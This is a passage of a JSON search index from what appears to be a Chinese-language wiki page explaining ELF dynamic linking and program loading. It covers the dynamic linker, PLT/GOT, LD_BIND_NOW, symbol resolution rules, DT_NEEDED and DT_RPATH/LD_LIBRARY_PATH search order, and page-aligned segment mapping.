\u53ef\u6267\u884c\u7a0b\u5e8f\u548c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5408\u4f5c\u8d77\u6765\u4e3a\u7a0b\u5e8f\u521b\u5efa\u8fdb\u7a0b\u955c\u50cf\uff0c\u5177\u4f53\u7684\u7ec6\u8282\u5982\u4e0b\uff1a \u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5b58\u6bb5\u6dfb\u52a0\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u3002 \u5c06\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u6bb5\u6dfb\u52a0\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u3002 \u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002 \u5982\u679c\u4f20\u9012\u7ed9\u4e86\u52a8\u6001\u94fe\u63a5\u5668\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u8bdd\uff0c\u5c31\u5c06\u5176\u5173\u95ed\u3002 \u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u8ba9\u6211\u4eec\u611f\u89c9\u8d77\u6765\u5c31\u597d\u50cf\u7a0b\u5e8f\u76f4\u63a5\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u5904\u62ff\u5230\u4e86\u6267\u884c\u6743\u9650\u3002 \u94fe\u63a5\u7f16\u8f91\u5668\u540c\u6837\u4e5f\u521b\u5efa\u4e86\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u6765\u534f\u52a9\u52a8\u6001\u94fe\u63a5\u5668\u6765\u5904\u7406\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u4f8b\u5982 \u7c7b\u578b\u4e3aSHT_DYNAMIC\u7684\u8282.dynamic\u5305\u542b\u4e86\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\uff0c\u5728\u8fd9\u4e2a\u8282\u7684\u5f00\u59cb\u5904\u5305\u542b\u4e86\u5176\u5b83\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\u3002 \u7c7b\u578b\u4e3aSHT_HASH\u7684\u8282.hash\u5305\u542b\u4e86\u7b26\u53f7\u54c8\u5e0c\u8868\u3002 \u7c7b\u578b\u4e3aSHT_PROGBITS\u7684\u8282.got\u4ee5\u53ca.plt\u5305\u542b\u4e86\u4e24\u4e2a\u72ec\u7acb\u7684\u8868\uff1a\u5168\u5c40\u504f\u79fb\u8868\uff0c\u8fc7\u7a0b\u94fe\u63a5\u8868\u3002\u7a0b\u5e8f\u4f1a\u5229\u7528\u8fc7\u7a0b\u94fe\u63a5\u8868\u6765\u5904\u7406\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u3002 \u56e0\u4e3a\u6240\u6709\u7684UNIX System V\u90fd\u4f1a\u4ece\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5bfc\u5165\u57fa\u672c\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u53c2\u4e0e\u5230\u6bcf\u4e00\u4e2aTIS ELF-conforming\u7684\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\u3002 \u6b63\u5982\u7a0b\u5e8f\u52a0\u8f7d\u4e2d\u6240\u8bf4\u7684\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u5360\u7528\u4e0e\u7a0b\u5e8f\u5934\u90e8\u4e2d\u8bb0\u5f55\u7684\u4e0d\u4e00\u6837\u7684\u865a\u62df\u5730\u5740\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5728\u7a0b\u5e8f\u62ff\u5230\u63a7\u5236\u6743\u524d\uff0c\u91cd\u5b9a\u4f4d\u5185\u5b58\u955c\u50cf\uff0c\u66f4\u65b0\u7edd\u5bf9\u5730\u5740\u3002\u5982\u679c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u786e\u5b9e\u52a0\u8f7d\u5230\u4e86\u5176\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6307\u5b9a\u7684\u5730\u5740\u7684\u8bdd\uff0c\u90a3\u4e48\u90a3\u4e9b\u7edd\u5bf9\u5730\u5740\u7684\u503c\u5c31\u4f1a\u662f\u6b63\u786e\u7684\u3002\u4f46\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0d\u4f1a\u53d1\u751f\u3002 \u5982\u679c\u8fdb\u7a0b\u7684\u73af\u5883\u4e2d\u6709\u540d\u53eb LD_BIND_NOW \u7684\u975e\u7a7a\u503c\uff0c\u90a3\u4e48\u52a8\u6001\u8fde\u63a5\u5668\u5728\u628a\u6743\u9650\u4f20\u9012\u7ed9\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u6267\u884c\u6240\u6709\u7684\u91cd\u5b9a\u4f4d\u3002\u4f8b\u5982\uff0c\u6240\u6709\u7684\u5982\u4e0b\u73af\u5883\u53d8\u91cf\u7684\u53d6\u503c\u90fd\u4f1a\u6307\u5b9a\u8fd9\u4e00\u884c\u4e3a\u3002 LD_BIND_NOW = 1 LD_BIND_NOW = on LD_BIND_NOW = off \u5426\u5219\uff0cLD_BIND_NOW \u8981\u4e48\u4e0d\u5b58\u5728\u4e8e\u5f53\u524d\u7684\u8fdb\u7a0b\u73af\u5883\u4e2d\uff0c\u8981\u4e48\u5177\u6709\u4e00\u4e2a\u975e\u7a7a\u503c\u3002\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u5ef6\u8fdf\u89e3\u6790\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5165\u53e3\uff0c\u8fd9\u5176\u5b9e\u5c31\u662fplt\u8868\u7684\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u5373\u5f53\u7a0b\u5e8f\u9700\u8981\u4f7f\u7528\u67d0\u4e2a\u7b26\u53f7\u65f6\uff0c\u518d\u8fdb\u884c\u5730\u5740\u89e3\u6790\uff0c\u8fd9\u53ef\u4ee5\u51cf\u5c11\u7b26\u53f7\u89e3\u6790\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u7684\u8d1f\u8f7d\u3002","title":"Dynamic Linker"},{"location":"executable/elf/program_linking/#function-address","text":"\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u7684\u5730\u5740\u5f15\u7528\u548c\u5171\u4eab\u76ee\u6807\u4e2d\u4e0e\u5176\u76f8\u5173\u7684\u5f15\u7528\u53ef\u80fd\u5e76\u4e0d\u4f1a\u88ab\u89e3\u6790\u4e3a\u4e00\u4e2a\u503c\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u5f15\u7528\u5c06\u4f1a\u88ab\u52a8\u6001\u94fe\u63a5\u5668\u89e3\u6790\u5230\u51fd\u6570\u672c\u8eab\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u5f15\u7528\uff08\u6765\u81ea\u4e8e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff09\u5c06\u4f1a\u88ab\u94fe\u63a5\u7f16\u8f91\u5668\u89e3\u6790\u4e3a\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u5bf9\u5e94\u51fd\u6570\u7684\u9879\u4e2d\u7684\u5730\u5740\u3002 \u4e3a\u4e86\u5141\u8bb8\u4e0d\u540c\u7684\u51fd\u6570\u5730\u5740\u53ef\u4ee5\u6309\u7167\u671f\u671b\u8fdb\u884c\u5de5\u4f5c\uff0c\u5982\u679c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u5f15\u7528\u4e86\u4e00\u4e2a\u5b9a\u4e49\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u94fe\u63a5\u7f16\u8f91\u5668\u5c31\u4f1a\u628a\u76f8\u5e94\u51fd\u6570\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u653e\u5230\u4e0e\u5b83\u5173\u8054\u7684\u7b26\u53f7\u8868\u8868\u9879\u4e2d\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5bf9\u8fd9\u79cd\u7b26\u53f7\u8868\u9879\u8fdb\u884c\u7279\u6b8a\u7684\u5904\u7406\u3002\u5982\u679c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5bfb\u627e\u4e00\u4e2a\u7b26\u53f7\uff0c\u5e76\u4e14\u9047\u5230\u4e86\u4e00\u4e2a\u7b26\u53f7\u8868\u9879\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\uff0c\u90a3\u4e48\u5b83\u4f1a\u9075\u5faa\u5982\u4e0b\u7684\u89c4\u5219\uff1a \u5982\u679c\u7b26\u53f7\u8868\u9879\u7684 st_shndx \u4e0d\u662f SHN_UNDEF \uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u627e\u5230\u8fd9\u4e2a\u7b26\u53f7\u7684\u5b9a\u4e49\uff0c\u5e76\u4e14\u4f7f\u7528\u5b83\u7684st_value\u6765\u4f5c\u4e3a\u7b26\u53f7\u7684\u5730\u5740\u3002 \u5982\u679c st_shndx \u662f SHN_UNDEF \u5e76\u4e14\u7b26\u53f7\u7684\u7c7b\u578b\u662f STT_FUNC \uff0c\u800c\u4e14 st_value \u6210\u5458\u4e0d\u662f0\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u8868\u9879\u89c6\u4e3a\u7279\u6b8a\u7684\uff0c\u5e76\u4e14\u4f7f\u7528 st_value \u7684\u503c\u4f5c\u4e3a\u7b26\u53f7\u7684\u5730\u5740\u3002 \u5426\u5219\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u4f1a\u8ba4\u4e3a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u662f\u672a\u5b9a\u4e49\u7684\uff0c\u7136\u540e\u7ee7\u7eed\u5904\u7406\u3002 \u4e00\u4e9b\u91cd\u5b9a\u4f4d\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u8868\u9879\u76f8\u5173\u3002\u8fd9\u4e9b\u8868\u9879\u88ab\u7528\u4e8e\u76f4\u63a5\u51fd\u6570\u8c03\u7528\uff0c\u800c\u4e0d\u662f\u5f15\u7528\u51fd\u6570\u5730\u5740\u3002\u8fd9\u4e9b\u91cd\u5b9a\u4f4d\u5e76\u4e0d\u4f1a\u6309\u7167\u4e0a\u9762\u7684\u65b9\u5f0f\u8fdb\u884c\u5904\u7406\uff0c\u56e0\u4e3a\u52a8\u6001\u94fe\u63a5\u5668\u5fc5\u987b\u4e0d\u80fd\u91cd\u5b9a\u5411\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u5e76\u4f7f\u5176\u6307\u5411\u5b83\u4eec\u672c\u8eab\u3002","title":"Function Address"},{"location":"executable/elf/program_linking/#shared-object-dependencies","text":"\u5f53\u94fe\u63a5\u7f16\u8f91\u5668\u5728\u5904\u7406\u4e00\u4e2a\u5f52\u6863\u5e93\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u63d0\u53d6\u51fa\u5e93\u6210\u5458\u5e76\u4e14\u628a\u5b83\u4eec\u62f7\u8d1d\u5230\u8f93\u51fa\u76ee\u6807\u6587\u4ef6\u4e2d\u3002\u8fd9\u79cd\u9759\u6001\u94fe\u63a5\u7684\u64cd\u4f5c\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u9700\u8981\u52a8\u6001\u8fde\u63a5\u5668\u53c2\u4e0e\u7684\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u540c\u65f6\u4e5f\u63d0\u4f9b\u4e86\u670d\u52a1\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5fc5\u987b\u5c06\u5408\u9002\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6attach\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\uff0c\u4ee5\u4fbf\u4e8e\u6267\u884c\u3002\u56e0\u6b64\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4f1a\u4e13\u95e8\u63cf\u8ff0\u4ed6\u4eec\u7684\u4f9d\u8d56\u5173\u7cfb\u3002 \u5f53\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5668\u4e3a\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u5185\u5b58\u6bb5\u65f6\uff0c\u5728DT_NEEDED\u9879\u4e2d\u63cf\u8ff0\u7684\u4f9d\u8d56\u7ed9\u51fa\u4e86\u9700\u8981\u4ec0\u4e48\u4f9d\u8d56\u6587\u4ef6\u6765\u652f\u6301\u7a0b\u5e8f\u7684\u670d\u52a1\u3002\u901a\u8fc7\u4e0d\u65ad\u5730\u8fde\u63a5\u88ab\u5f15\u7528\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08\u5373\u4f7f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u88ab\u5f15\u7528\u591a\u6b21\uff0c\u5b83\u6700\u540e\u4e5f\u53ea\u4f1a\u88ab\u52a8\u6001\u94fe\u63a5\u5668\u8fde\u63a5\u4e00\u6b21\uff09\u53ca\u5b83\u4eec\u7684\u4f9d\u8d56\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5efa\u7acb\u4e86\u4e00\u4e2a\u5b8c\u5168\u7684\u8fdb\u7a0b\u955c\u50cf\u3002\u5f53\u89e3\u6790\u7b26\u53f7\u5f15\u7528\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u4f7f\u7528BFS\uff08\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff09\u6765\u68c0\u67e5\u7b26\u53f7\u8868\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u9996\u5148\uff0c\u5b83\u4f1a\u68c0\u67e5\u53ef\u6267\u884c\u6587\u4ef6\u672c\u8eab\u7684\u7b26\u53f7\u8868\uff0c\u7136\u540e\u624d\u4f1a\u6309\u7167\u987a\u5e8f\u68c0\u67e5DT_NEEDED\u5165\u53e3\u4e2d\u7684\u7b26\u53f7\u8868\uff0c\u7136\u540e\u624d\u4f1a\u7ee7\u7eed\u67e5\u770b\u4e0b\u4e00\u6b21\u4f9d\u8d56\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u53ef\u4ee5\u88ab\u7a0b\u5e8f\u8bfb\u53d6\uff0c\u5176\u5b83\u6743\u9650\u4e0d\u4e00\u5b9a\u9700\u8981\u3002 \u4f9d\u8d56\u5217\u8868\u4e2d\u7684\u540d\u5b57\u8981\u4e48\u662fDT_SONAME\u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u8981\u4e48\u662f\u7528\u4e8e\u6784\u5efa\u5bf9\u5e94\u76ee\u6807\u6587\u4ef6\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84\u540d\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u94fe\u63a5\u5668\u4f7f\u7528\u4e86\u4e00\u4e2a\u5e26\u6709DT_SONAME\u9879\u540d\u5b57\u53eb\u505alib1\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4ee5\u53ca\u4e00\u4e2a\u5176\u4ed6\u8def\u5f84\u540d\u4e3a/usr/lib/lib2\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u90a3\u4e48\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5c06\u4f1a\u5305\u542blib1\u4ee5\u53ca/usr/lib/lib2\u4f9d\u8d56\u5217\u8868\u3002 \u5982\u679c\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5177\u6709\u4e00\u4e2a\u6216\u8005\u591a\u4e2a/\uff0c\u4f8b\u5982/usr/lib/lib2\u6216\u8005directory/file\uff0c\u90a3\u4e48\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u76f4\u63a5\u4f7f\u7528\u90a3\u4e2a\u5b57\u7b26\u4e32\u6765\u4f5c\u4e3a\u8def\u5f84\u7684\u540d\u5b57\u3002\u5982\u679c\u540d\u5b57\u4e2d\u6ca1\u6709/\uff0c\u6bd4\u5982lib1\uff0c\u90a3\u4e48\u4ee5\u4e0b\u7684\u4e09\u79cd\u673a\u5236\u7ed9\u51fa\u4e86\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u641c\u7d22\u7684\u987a\u5e8f\u3002 \u9996\u5148\uff0c\u52a8\u6001\u6570\u7ec4\u6807\u8bb0DT_RPATH\u53ef\u80fd\u4f1a\u7ed9\u51fa\u4e00\u4e2a\u5305\u542b\u4e00\u7cfb\u5217\u4ee5:\u5206\u5272\u7684\u76ee\u5f55\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982 /home/dir/lib:/home/dir2/lib: \u544a\u8bc9\u6211\u4eec\u5148\u5728 /home/dir/lib \u76ee\u5f55\u641c\u7d22\uff0c\u7136\u540e\u518d\u5728 /home/dir2/lib \u641c\u7d22\uff0c\u6700\u540e\u5728\u5f53\u524d\u76ee\u5f55\u641c\u7d22\u3002 \u5176\u6b21\uff0c\u8fdb\u7a0b\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u540d\u53ebLD_LIBRARY_PATH\u7684\u53d8\u91cf\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u4e0a\u8ff0\u6240\u8bf4\u683c\u5f0f\u7684\u76ee\u5f55\uff0c\u6700\u540e\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a;\uff0c\u540e\u9762\u8ddf\u7740\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u5217\u8868\u540e\u9762\u8ddf\u7740\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u5217\u8868\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6548\u679c\u4e0e\u7b2c\u4e00\u4e2a\u6240\u8bf4\u7684\u6548\u679c\u76f8\u540c LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib: LD_LIBRARY_PATH=/home/dir/lib;/home/dir2/lib: LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:; \u6240\u6709\u7684LD_LIBRARY_PATH\u4e2d\u7684\u76ee\u5f55\u53ea\u4f1a\u5728\u641c\u7d22\u5b8cDT_RPATH\u624d\u4f1a\u8fdb\u884c\u641c\u7d22\u3002\u5c3d\u7ba1\u6709\u4e00\u4e9b\u7a0b\u5e8f\uff08\u5982\u94fe\u63a5\u7f16\u8f91\u5668\uff09\u5728\u5904\u7406;\u524d\u540e\u7684\u5217\u8868\u7684\u65b9\u5f0f\u4e0d\u540c\uff0c\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5904\u7406\u7684\u65b9\u5f0f\u5b8c\u5168\u4e00\u6837\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u63a5\u53d7\u5206\u53f7\u8868\u793a\u8bed\u6cd5\uff0c\u6b63\u5982\u4e0a\u9762\u6240\u63cf\u8ff0\u7684\u6837\u5b50\u3002 \u6700\u540e\uff0c\u5982\u679c\u4ee5\u4e0a\u4e24\u7ec4\u76ee\u5f55\u65e0\u6cd5\u5b9a\u4f4d\u671f\u671b\u7684\u5e93\uff0c\u5219\u52a8\u6001\u94fe\u63a5\u5668\u641c\u7d22 /usr/lib \u8def\u5f84\u4e0b\u7684\u5e93\u3002 \u6ce8\u610f \u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u5bf9\u4e8e set-user \u4ee5\u53ca set-group \u6807\u8bc6\u7684\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5ffd\u7565\u641c\u7d22\u73af\u5883\u53d8\u91cf\uff08\u4f8b\u5982 LD_LIBRARY_PATH \uff09\uff0c\u4ec5\u4ec5\u641c\u7d22 DT_RPATH \u6307\u5b9a\u7684\u76ee\u5f55\u548c /usr/lib \u3002","title":"Shared Object Dependencies"},{"location":"executable/elf/program_loading/","text":"\u52a0\u8f7d \u00b6 \u7a0b\u5e8f\u52a0\u8f7d\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u7cfb\u7edf\u521b\u5efa\u6216\u8005\u6216\u8005\u6269\u5145\u8fdb\u7a0b\u955c\u7684\u8fc7\u7a0b\u3002\u5b83\u53ea\u662f\u6309\u7167\u4e00\u5b9a\u7684\u89c4\u5219\u628a\u6587\u4ef6\u7684\u6bb5\u62f7\u8d1d\u5230\u865a\u62df\u5185\u5b58\u6bb5\u4e2d\u3002\u8fdb\u7a0b\u53ea\u6709\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u5bf9\u5e94\u7684\u903b\u8f91\u9875\u9762\u65f6\uff0c\u624d\u4f1a\u7533\u8bf7\u76f8\u5e94\u7684\u7269\u7406\u9875\u9762\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u6709\u5f88\u591a\u9875\u662f\u6ca1\u6709\u88ab\u5f15\u7528\u7684\u3002\u56e0\u6b64\uff0c\u5ef6\u8fdf\u7269\u7406\u8bfb\u5199\u53ef\u4ee5\u63d0\u9ad8\u7cfb\u7edf\u7684\u6027\u80fd\u3002\u4e3a\u4e86\u8fbe\u5230\u8fd9\u6837\u7684\u6548\u7387\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6240\u62e5\u6709\u7684\u6bb5\u7684\u6587\u4ef6\u504f\u79fb\u4ee5\u53ca\u865a\u62df\u5730\u5740\u5fc5\u987b\u662f\u5408\u9002\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ed6\u4eec\u5fc5\u987b\u662f\u9875\u5927\u5c0f\u7684\u6574\u6570\u500d\u3002 \u5728Intel\u67b6\u6784\u4e2d\uff0c\u865a\u62df\u5730\u5740\u4ee5\u53ca\u6587\u4ef6\u504f\u79fb\u5fc5\u987b\u662f4KB\u7684\u6574\u6570\uff0c\u6216\u8005\u8bf4\u662f\u66f4\u5927\u76842\u7684\u6574\u6570\u500d\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u5e03\u5c40\u7684\u4f8b\u5b50 \u5bf9\u5e94\u7684\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6570\u636e\u6bb5\u7684\u89e3\u91ca\u5982\u4e0b \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c3d\u7ba1\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u5728\u6a214KB\u7684\u610f\u4e49\u4e0b\u76f8\u7b49\uff0c\u4f46\u662f\u4ecd\u7136\u6700\u591a\u67094\u4e2a\u9875\u9762\u5305\u542b\u6709\u4e0d\u7eaf\u7684\u4ee3\u7801\u6216\u8005\u6570\u636e\u3002\u5f53\u7136\uff0c\u5b9e\u9645\u4e2d\u4f1a\u53d6\u51b3\u4e8e\u9875\u5927\u5c0f\u6216\u8005\u6587\u4ef6\u7cfb\u7edf\u7684\u5757\u5927\u5c0f\u3002 \u4ee3\u7801\u6bb5\u7684\u7b2c\u4e00\u4e2a\u9875\u5305\u542b\u4e86ELF\u5934\uff0c\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u4ee5\u53ca\u5176\u4ed6\u4fe1\u606f\u3002 \u4ee3\u7801\u6bb5\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e86\u6570\u636e\u6bb5\u5f00\u59cb\u90e8\u5206\u7684\u526f\u672c\u3002 \u6570\u636e\u6bb5\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e86\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u90e8\u5206\u7684\u526f\u672c\u3002\u81f3\u4e8e\u591a\u5c11\uff0c\u6682\u672a\u8bf4\u660e\u3002 \u6570\u636e\u6bb5\u7684\u6700\u540e\u4e00\u90e8\u5206\u53ef\u80fd\u4f1a\u5305\u542b\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u65e0\u5173\u7684\u4fe1\u606f\u3002 \u903b\u8f91\u4e0a\u8bf4\uff0c\u7cfb\u7edf\u4f1a\u5bf9\u5f3a\u5236\u63a7\u5236\u5185\u5b58\u7684\u6743\u9650\uff0c\u5c31\u597d\u6bd4\u6bcf\u4e00\u4e2a\u6bb5\u7684\u6743\u9650\u90fd\u662f\u5b8c\u5168\u72ec\u7acb\u7684\uff1b\u6bb5\u7684\u5730\u5740\u4f1a\u88ab\u8c03\u6574\uff0c\u4ee5\u4fbf\u4e8e\u786e\u4fdd\u5185\u5b58\u4e2d\u7684\u6bcf\u4e00\u4e2a\u903b\u8f91\u9875\u90fd\u53ea\u6709\u4e00\u7ec4\u7c7b\u578b\u7684\u6743\u9650\u3002\u5728\u4e0a\u9762\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\uff0c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u4e00\u90e8\u5206\u548c\u6570\u636e\u6bb5\u7684\u5f00\u59cb\u90e8\u5206\u90fd\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff1a\u5206\u522b\u5728\u6570\u636e\u6bb5\u7684\u865a\u62df\u5730\u5740\u4ee5\u53ca\u4ee3\u7801\u6bb5\u7684\u865a\u62df\u5730\u5740\u3002 \u6570\u636e\u6bb5\u7684\u7ed3\u5c3e\u9700\u8981\u597d\u597d\u5904\u7406\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u6570\u636e\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7cfb\u7edf\u8981\u6c42\u5b83\u4eec\u4ee50\u5f00\u59cb\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u6587\u4ef6\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e0d\u5728\u903b\u8f91\u9875\u4e2d\u7684\u4fe1\u606f\uff0c\u90a3\u4e48\u5269\u4e0b\u7684\u6570\u636e\u5fc5\u987b\u88ab\u521d\u59cb\u5316\u4e3a0\u3002\u5269\u4e0b\u7684\u4e09\u4e2a\u9875\u4e2d\u7684\u6742\u8d28\u6570\u636e\u5728\u903b\u8f91\u4e0a\u8bf4\u5e76\u4e0d\u662f\u8fdb\u7a0b\u955c\u50cf\u7684\u4e00\u90e8\u5206\uff0c\u7cfb\u7edf\u53ef\u4ee5\u9009\u62e9\u5220\u9664\u5b83\u4eec\u3002\u8be5\u6587\u4ef6\u5bf9\u5e94\u7684\u865a\u62df\u5185\u5b58\u955c\u50cf\u5982\u4e0b\uff08\u5047\u8bbe\u6bcf\u4e00\u9875\u5927\u5c0f\u4e3a4KB\uff09 \u5728\u52a0\u8f7d\u6bb5\u65f6\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4e0e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u6240\u533a\u522b\u3002\u53ef\u6267\u884c\u6587\u4ef6\u901a\u5e38\u6765\u8bf4\u5305\u542b\u7edd\u5bf9\u4ee3\u7801\u3002\u4e3a\u4e86\u80fd\u591f\u4f7f\u5f97\u7a0b\u5e8f\u6b63\u786e\u6267\u884c\uff0c\u6bcf\u4e00\u4e2a\u6bb5\u5e94\u8be5\u5728\u7528\u4e8e\u6784\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u56e0\u6b64\uff0c\u7cfb\u7edf\u76f4\u63a5\u4f7f\u7528p_vaddr\u4f5c\u4e3a\u865a\u62df\u5730\u5740\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u5e38\u5305\u542b\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u3002\u8fd9\u4f7f\u5f97\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u4e2d\uff0c\u540c\u4e00\u6bb5\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u8fd9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u884c\u4e3a\u3002\u5c3d\u7ba1\u7cfb\u7edf\u4f1a\u4e3a\u4e0d\u540c\u7684\u8fdb\u7a0b\u9009\u62e9\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u4f46\u662f\u5b83\u4ecd\u65e7\u7ef4\u6301\u4e86\u6bb5\u7684\u76f8\u5bf9\u5730\u5740\u3002\u56e0\u4e3a\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u6bb5\u4e2d\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff0c\u56e0\u6b64\u5728\u865a\u62df\u5185\